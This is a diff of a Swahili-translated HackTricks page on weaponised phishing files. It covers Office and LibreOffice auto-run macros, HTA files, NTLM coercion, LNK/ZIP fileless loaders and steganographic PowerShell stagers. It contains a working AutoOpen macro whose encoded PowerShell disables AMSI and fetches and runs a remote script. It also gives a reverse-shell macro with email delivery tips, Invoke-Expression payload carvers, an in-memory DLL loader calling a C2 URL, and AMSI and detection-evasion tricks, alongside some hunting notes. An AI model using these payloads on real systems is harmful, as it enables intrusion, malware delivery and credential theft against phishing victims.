@@ -1,40 +1,40 @@
-# Phishing Faili & Nyaraka
+# Phishing Files & Documents
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Nyaraka
+## Nyaraka za Office
 
-Microsoft Word hufanya uhakiki wa data za faili kabla ya kufungua faili. Uhakiki wa data unafanywa kwa njia ya utambuzi wa muundo wa data, kulingana na kiwango cha OfficeOpenXML. Ikiwa kosa lolote litatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.
+Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Iwapo hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.
 
-Kawaida, Word files zenye macros hutumia extension ya `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha file extension na bado kuendelea kuwa na uwezo wao wa kutekeleza macros.\
-Kwa mfano, faili la RTF halitegemei macros, kwa muundo, lakini faili la DOCM likibadilishwa jina kuwa RTF litashughulikiwa na Microsoft Word na litakuwa na uwezo wa kutekeleza macro.\
-Mifumo ya ndani na mbinu sawa zinatumika kwa software zote za Microsoft Office Suite (Excel, PowerPoint etc.).
+Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadili jina la faili kwa kubadilisha kiendelezi cha faili na bado kuhifadhi uwezo wao wa kuendesha macros.\
+Kwa mfano, faili ya RTF haiungi mkono macros, kwa muundo wake, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
+Mifumo na mekanizimu zilezile za ndani zinatumika kwa software yote ya Microsoft Office Suite (Excel, PowerPoint etc.).
 
-Unaweza kutumia amri ifuatayo ili kuangalia ni extensions zipi zitatekelezwa na baadhi ya programu za Office:
+Unaweza kutumia amri ifuatayo kuangalia ni viendelezi gani vitatekelezwa na baadhi ya programu za Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+DOCX files zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) ambayo inajumuisha macros zinaweza pia “kutekeleza” macros.
 
-### Kupakia Picha ya Nje
+### External Image Load
 
-Go to: _Insert --> Quick Parts --> Field_\
-_**Vikundi**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
+Nenda: _Insert --> Quick Parts --> Field_\
+_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://<ip>/whatever
 
-![](<../../images/image (155).png>)
+![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
 
-### Backdoor ya Macros
+### Macros Backdoor
 
-Inawezekana kutumia macros kuendesha msimbo wa aina yoyote kutoka kwenye hati.
+Inawezekana kutumia macros kuendesha code yoyote kutoka kwenye document.
 
-#### Funsi za Autoload
+#### Autoload functions
 
-Kadri zinavyokuwa za kawaida, ndivyo uwezekano wa AV kuzigundua unavyoongezeka.
+Kadiri zinavyokuwa za kawaida zaidi, ndivyo uwezekano mkubwa AV itazigundua.
 
 - AutoOpen()
 - Document_Open()
 
-#### Mifano ya Msimbo ya Macros
+#### Macros Code Examples
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -66,39 +66,39 @@ proc.Create "powershell <beacon line generated>
 ```
 #### Ondoa metadata kwa mikono
 
-Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itaonyesha Document Inspector. Bonyeza **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.
+Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bofya **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.
 
-#### Ugani la Doc
+#### Doc Extension
 
-Ukimaliza, chagua kidirisha cha **Save as type**, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
-Fanya hivyo kwa sababu **huwezi kuhifadhi macro's ndani ya `.docx`** na kuna **tabu** **kuhusu** ugani wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/barua pepe huzuia kabisa). Kwa hivyo, **ugani la warithi `.doc` ndilo suluhisho bora**.
+Ukimaliza, chagua menyu kunjuzi ya **Save as type**, badilisha format kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
+Fanya hivi kwa sababu **huwezi kuhifadhi macro's ndani ya `.docx`** na kuna **stigma** **kuhusu** extension ya **`.docm`** inayowezesha macros (mfano, thumbnail icon ina `!` kubwa na baadhi ya web/email gateway huzi-block kabisa). Kwa hiyo, hii **legacy `.doc` extension** ndiyo **best compromise**.
 
-#### Jenereta za Macros Hasidi
+#### Malicious Macros Generators
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## LibreOffice ODT macros zinazoendesha kiotomatiki (Basic)
+## LibreOffice ODT auto-run macros (Basic)
 
-Nyaraka za LibreOffice Writer zinaweza kujumuisha Basic macros na kuzitekeleza kiotomatiki wakati faili inafunguliwa kwa kuambatanisha macro na tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…). Macro rahisi ya reverse shell inavyoonekana:
+LibreOffice Writer documents zinaweza kupachika Basic macros na kuzi-execute moja kwa moja zinapofunguliwa kwa ku-binda macro kwenye event ya **Open Document** (Tools → Customize → Events → Open Document → Macro…). Macro rahisi ya reverse shell inaonekana hivi:
 ```vb
 Sub Shell
 Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
 End Sub
 ```
-Note the doubled quotes (`""`) inside the string – LibreOffice Basic inazitumia ku-escape nukuu za literal, hivyo payloads ambazo zinaishia na `...==""")` zinahifadhi amri ya ndani na hoja ya Shell zikiwa sawa.
+Tambua nukuu zilizoongezwa mara mbili (`""`) ndani ya string – LibreOffice Basic huzitumia kuficha literal quotes, hivyo payloads zinazoishia kwa `...==""")` huweka command ya ndani na argument ya Shell vikiwa balanced.
 
-Delivery tips:
+Vidokezo vya delivery:
 
-- Hifadhi kama `.odt` na uhusishe macro na event ya document ili itekelezwe mara moja inapofunguliwa.
-- Unapomtumia `swaks` kwa email, tumia `--attach @resume.odt` (the `@` inahitajika ili file bytes, sio filename string, zitumiwe kama attachment). Hii ni muhimu unapokuwa unayetumia kwa mbaya SMTP servers zinazokubali arbitrary `RCPT TO` recipients bila uthibitisho.
+- Hifadhi kama `.odt` na funga macro kwenye event ya document ili ianze mara moja inapofunguliwa.
+- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, si string ya jina la faili, zitumwe kama attachment). Hii ni muhimu sana unapoitumia vibaya SMTP servers zinazokubali recipients wa `RCPT TO` bila validation.
 
-## Faili za HTA
+## HTA Files
 
-An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
+HTA ni programu ya Windows inayochanganya HTML na scripting languages (kama VBScript na JScript). Huunda user interface na hutekeleza kama application "fully trusted", bila vikwazo vya usalama vya browser.
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
+HTA hutekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **husakinishwa** pamoja na **Internet Explorer**, hivyo **`mshta` hutegemea IE**. Kwa hiyo ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -153,11 +153,11 @@ var_func
 self.close
 </script>
 ```
-## Kulazimisha Uthibitishaji wa NTLM
+## Kulazimisha NTLM Authentication
 
-Kuna njia kadhaa za **kulazimisha uthibitishaji wa NTLM "mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** katika barua pepe au HTML ambazo mtumiaji atazitumia (hata HTTP MitM?). Au mtumie mwathiriwa **anwani za faili** ambazo zitasababisha **uthibitishaji** kwa kufungua tu folda.
+Kuna njia kadhaa za **kulazimisha NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye emails au HTML ambazo mtumiaji atafikia (hata HTTP MitM?). Au mtumie mhasiriwa **anwani ya files** ambazo **zitachochea** **authentication** kwa ajili ya **kufungua folder** pekee.
 
-**Angalia mawazo haya na mengine katika kurasa zifuatazo:**
+**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**
 
 
 {{#ref}}
@@ -171,24 +171,24 @@ Kuna njia kadhaa za **kulazimisha uthibitishaji wa NTLM "mbali"**, kwa mfano, un
 
 ### NTLM Relay
 
-Usisahau kwamba hauwezi tu kuiba hash au uthibitishaji, bali pia unaweza kufanya **NTLM relay attacks**:
+Usisahau kwamba huwezi tu kuiba hash au authentication bali pia unaweza **kutekeleza NTLM relay attacks**:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Kampeni zinazofanya kazi vizuri mara nyingi hutuma ZIP inayojumuisha nyaraka mbili halali za kudanganya (PDF/DOCX) na .lnk hatari. Mbinu ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya bytes ghafi za ZIP baada ya alama ya kipekee, na .lnk hutoka (carve) na kuiendesha kabisa kwenye kumbukumbu.
+Kampeni zenye ufanisi mkubwa huwasilisha ZIP ambayo ina hati mbili halali za chambo (PDF/DOCX) na .lnk yenye nia mbaya. Ujanja ni kwamba PowerShell loader halisi huhifadhiwa ndani ya bytes ghafi za ZIP baada ya marker ya kipekee, na .lnk huiokota na kuiendesha kikamilifu kwenye memory.
 
-Mtiririko wa kawaida unaotekelezwa na PowerShell one-liner ya .lnk:
+Mtiririko wa kawaida uliotekelezwa na one-liner ya PowerShell ya .lnk:
 
-1) Tafuta ZIP asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na saraka mzazi ya current working directory.  
-2) Soma bytes za ZIP na tafuta alama iliyowekwa (hardcoded) (kwa mfano, xFIQCV). Kila kitu kinachofuata baada ya alama ni embedded PowerShell payload.  
-3) Nakili ZIP hadi %ProgramData%, ifungue huko, na ufungue .docx ya kudanganya ili ionekane halali.  
-4) Pitia AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
-5) Deobfuscate hatua inayofuata (kwa mfano, ondoa tabia zote za #) na uitekeleze katika kumbukumbu.
+1) Tafuta ZIP ya asili kwenye paths za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent wa current working directory.
+2) Soma bytes za ZIP na upate marker iliyowekwa hardcoded (mfano, xFIQCV). Kila kitu baada ya marker ni embedded PowerShell payload.
+3) Nakili ZIP kwenda %ProgramData%, ifute hapo, na fungua .docx ya chambo ili ionekane halali.
+4) Pita AMSI kwa process ya sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Ondoa obfuscation ya stage inayofuata (mfano, ondoa herufi zote #) na uitekeleze kwenye memory.
 
-Mfano wa skeleton wa PowerShell kuvitunga na kuendesha hatua iliyojengewa ndani:
+Mfano wa skeleton ya PowerShell ya kuokota na kuendesha stage iliyopachikwa:
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -206,36 +206,89 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Notes
-- Usambazaji mara nyingi hutumia vibaya subdomain za PaaS zenye sifa (mfano, *.herokuapp.com) na linaweza kuzuia payloads (kutoa ZIPs zisizo hatari kulingana na IP/UA).
-- Hatua inayofuata mara nyingi hu-decrypt base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza athari za diski.
+- Delivery mara nyingi hutumia vibaya subdomains za PaaS zenye sifa nzuri (k.m. *.herokuapp.com) na huenda zikazuia payloads (kutoa ZIP zisizo na madhara kulingana na IP/UA).
+- Hatua inayofuata mara nyingi hufungua base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza artifacts za disk.
 
-Persistence used in the same chain
-- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au programu yoyote inayoi-embed ianzishe payload tena kiotomatiki. Tazama maelezo na amri tayari-kutumiwa hapa:
+Persistence iliyotumiwa katika mnyororo huohuo
+- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au app yoyote inayoiingiza izindue payload upya kiotomatiki. Angalia maelezo na commands tayari-kutumia hapa:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Utafutaji/IOCs
-- ZIP files containing the ASCII marker string (mfano, xFIQCV) iliyoongezwa kwenye data ya archive.
-- .lnk inayoorodhesha folda za parent/user kutafuta ZIP na kufungua waraka wa decoy.
-- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Long-running business threads zinazoishia kwa links zilizo hosted chini ya trusted PaaS domains.
+Hunting/IOCs
+- ZIP files zenye ASCII marker string (k.m. xFIQCV) iliyoongezwa mwishoni mwa data ya archive.
+- .lnk ambayo huhesabu parent/user folders ili kutafuta ZIP na kufungua decoy document.
+- AMSI tampering kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Long-running business threads zinazomalizika kwa links zilizohostiwa chini ya trusted PaaS domains.
 
-## Steganography-delimited payloads in images (PowerShell stager)
+## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading
 
-Recent loader chains huwasilisha JavaScript/VBS iliyopotoshwa ambayo ina-decode na kuendesha Base64 PowerShell stager. Stager hiyo hupakua picha (mara nyingi GIF) inayobeba Base64-encoded .NET DLL iliyofichwa kama plain text kati ya alama za kipekee za kuanza/kuisha. Script inatafuta delimiters hizi (mifano iliyodhihirika: «<<sudo_png>> … <<sudo_odt>>>»), inachukua maandishi yaliyopo kati yao, ina-decode Base64 hadi bytes, inapakia assembly in-memory na ina-invoke entry method inayojulikana ikitumia C2 URL.
+Mfumo mwingine unaojirudia ni **`.lnk` inayojifanya document** ambayo hufungua mara moja lure isiyo na madhara huku ikiweka chain halisi nyuma kwa nyuma.
 
-Mtiririko
-- Hatua 1: Archived JS/VBS dropper → ina-decode Base64 iliyowekwa ndani → ina-launch PowerShell stager na -nop -w hidden -ep bypass.
-- Hatua 2: PowerShell stager → hupakua picha, ina-tenga Base64 iliyotengwa na markers, inapakia .NET DLL in-memory na inaita method yake (mfano, VAI) ikituma C2 URL na chaguzi.
-- Hatua 3: Loader huchukua final payload na kwa kawaida huingiza kwa process hollowing ndani ya binary inayotegemewa (kwa kawaida MSBuild.exe). Tazama zaidi kuhusu process hollowing na trusted utility proxy execution hapa:
+Workflow iliyozingatiwa:
+1. Shortcut **hujifanya PDF** na hutumia conhost.exe au proxy inayofanana kuzindua obfuscated PowerShell downloader.
+2. PowerShell hugawa tokens dhahiri (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili detections za kawaida zinazotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` zishindwe kuona command.
+3. Stager hupakua **decoy document kwanza**, huifungua kwa mhanga, kisha hujenga upya malicious files nyuma kwa nyuma.
+4. Payloads huenda zikandikwa kwa **junk extensions** kisha kubadilishwa jina kwa kuondoa filler characters, hivyo kuchelewesha kuonekana kwa artifacts dhahiri za `.exe` / `.cpl`.
+5. Persistence huwekwa kwa **scheduled task ya kila dakika** inayozindua trusted host binary kutoka kwenye path inayoweza kuandikiwa na user.
+
+Vidokezo vidogo vya hunting kutoka kwenye pattern hii:
+```powershell
+# Suspicious split-token PowerShell seen in LNK chains
+iw''r
+r''e''n
+&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
+```
+Tengenezo ya staging inayofaa kutambua ni:
+- `C:\Users\Public\<decoy>.pdf`
+- `C:\Users\Public\<trusted>.exe`
+- `C:\Users\Public\<malicious>.cpl` or `.dll`
+- `C:\Windows\Tasks\<blob>.dat`
+
+### Kwa nini stage ya pili ni ya siri
+
+Katika case study ya Rapid7, scheduled task ilizindua mara kwa mara **`Fondue.exe`** kutoka `C:\Users\Public\`. Kwa kuwa **`APPWIZ.cpl`** iliwekwa karibu nayo na kusafirisha **`RunFODW`**, binary ya Microsoft iliyoaminika ili side-load CPL ya mshambuliaji badala ya nakala halali ya mfumo.
+
+Kisha CPL:
+- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
+- Huyasimbua kupitia **Windows CNG / `bcrypt.dll`**
+- Hutenga executable memory na kunakili shellcode iliyosimbuliwa
+- Huitoa kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback kwa **`EnumUILanguagesW`**
+
+Hatua hiyo ya mwisho inafaa kuwindwa kivyake: malware mara nyingi huepuka direct `((void(*)())buf)()` jump na badala yake hutumia **legitimate callback-taking WinAPI** ili kuhamisha execution.
+
+Payload iliyosimbuliwa katika kampeni hii ilikuwa **Donut** shellcode, ambayo kisha ilimapa final PE kikamilifu kwenye memory na kubandika **AMSI/WLDP/ETW** katika current process kabla ya kukabidhi execution. Kwa maelezo ya kina zaidi kuhusu side-loading na memory-resident post-processing, tazama:
+
+{{#ref}}
+../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
+{{#endref}}
+
+{{#ref}}
+../../windows-hardening/av-bypass.md
+{{#endref}}
+
+Mielekeo ya uwindaji ya vitendo:
+- `.lnk` inayozindua `powershell.exe` au `conhost.exe` ikifuatiwa na decoy document inayoonekana.
+- Downloads za muda mfupi kwenda **`C:\Users\Public\`** zikifuatiwa mara moja na renames kutoka kwa extensions zisizo na maana.
+- Scheduled tasks zenye majina ya kawaida kama `GoogleErrorReport` zikitekelezwa kutoka **user-writable directories**.
+- Trusted binaries zinazopakia faili za **`.cpl` / `.dll`** kutoka directory ileile isiyo ya mfumo.
+- Base64 text blobs zilizoandikwa chini ya **`C:\Windows\Tasks\`** kisha kusomwa na module iliyoside-loadiwa.
+
+## Steganography-delimited payloads katika images (PowerShell stager)
+
+Mifumo ya loader ya hivi karibuni hupeleka obfuscated JavaScript/VBS inayodesha na kuendesha Base64 PowerShell stager. Hiyo stager hupakua image (mara nyingi GIF) ambayo ina .NET DLL iliyoandikwa kwa Base64 iliyofichwa kama plain text kati ya unique start/end markers. Script hutafuta delimiters hizi (examples zilizoonekana kwa vitendo: «<<sudo_png>> … <<sudo_odt>>>»), huchukua maandishi ya kati, huyadesha Base64 kuwa bytes, hu-load assembly ndani ya memory na kuita known entry method kwa C2 URL.
+
+Workflow
+- Stage 1: Archived JS/VBS dropper → hudesha embedded Base64 → huzindua PowerShell stager na -nop -w hidden -ep bypass.
+- Stage 2: PowerShell stager → hupakua image, hukata Base64 iliyozungukwa na marker, hu-load .NET DLL ndani ya memory na kuita method yake (e.g., VAI) ikipitisha C2 URL na options.
+- Stage 3: Loader hupata final payload na kwa kawaida huiinject kupitia process hollowing ndani ya trusted binary (kawaida MSBuild.exe). Tazama zaidi kuhusu process hollowing na trusted utility proxy execution hapa:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
 {{#endref}}
 
-PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:
+Mfano wa PowerShell wa kutoa DLL kutoka kwenye image na kuita method ya .NET ndani ya memory:
 
 <details>
 <summary>PowerShell stego payload extractor and loader</summary>
@@ -262,12 +315,12 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 ```
 </details>
 
-Vidokezo
-- Hii ni ATT&CK T1027.003 (steganography/marker-hiding). Markers zinatofautiana kati ya kampeni.
-- AMSI/ETW bypass na string deobfuscation mara nyingi zinatekelezwa kabla ya kupakia assembly.
-- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.
+Maelezo
+- Hii ni ATT&CK T1027.003 (steganography/marker-hiding). Alama hubadilika kati ya kampeni.
+- AMSI/ETW bypass na string deobfuscation hutumika kwa kawaida kabla ya kupakia assembly.
+- Hunting: chunguza picha zilizopakuliwa kwa delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja kusimba Base64 blobs.
 
-See also stego tools and carving techniques:
+Tazama pia stego tools na carving techniques:
 
 {{#ref}}
 ../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
@@ -275,17 +328,17 @@ See also stego tools and carving techniques:
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-Awamu ya mwanzo inayojitokeza mara kwa mara ni `.js` ndogo au `.vbs` iliyofichwa sana, inayowasilishwa ndani ya archive. Lengo lake pekee ni ku-decode kamba ya Base64 iliyojengwa ndani na kuanzisha PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha awamu inayofuata kupitia HTTPS.
+Hatua ya awali inayojirudia ni `.js` au `.vbs` ndogo, iliyofichwa sana, inayotolewa ndani ya archive. Kusudi lake pekee ni kusimba string ya Base64 iliyopachikwa na kuzindua PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.
 
-Mantiki ya msingi (muhtasari):
-- Soma yaliyomo ya faili mwenyewe
-- Tafuta blob ya Base64 kati ya mistring ya takataka
-- Decode hadi ASCII PowerShell
-- Endesha kwa `wscript.exe`/`cscript.exe` ikimuita `powershell.exe`
+Mantiki ya skeleton (abstract):
+- Soma maudhui ya faili yake yenyewe
+- Tafuta blob ya Base64 kati ya junk strings
+- Simba kwenda ASCII PowerShell
+- Tekeleza kwa `wscript.exe`/`cscript.exe` ikiita `powershell.exe`
 
-Vidokezo vya upelelezi
-- Viambatisho vya JS/VBS vilivyohifadhiwa ndani ya archive vinavyoanzisha `powershell.exe` kwa `-enc`/`FromBase64String` kwenye mstari wa amri.
-- `wscript.exe` ikianzisha `powershell.exe -nop -w hidden` kutoka katika user temp paths.
+Viashiria vya hunting
+- Viambatisho vya JS/VBS vilivyowekwa kwenye archive vikizalisha `powershell.exe` na `-enc`/`FromBase64String` kwenye command line.
+- `wscript.exe` ikizindua `powershell.exe -nop -w hidden` kutoka paths za temp za mtumiaji.
 
 ## Windows files to steal NTLM hashes
 
@@ -300,6 +353,7 @@ Angalia ukurasa kuhusu **places to steal NTLM creds**:
 
 - [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
 - [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
 - [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
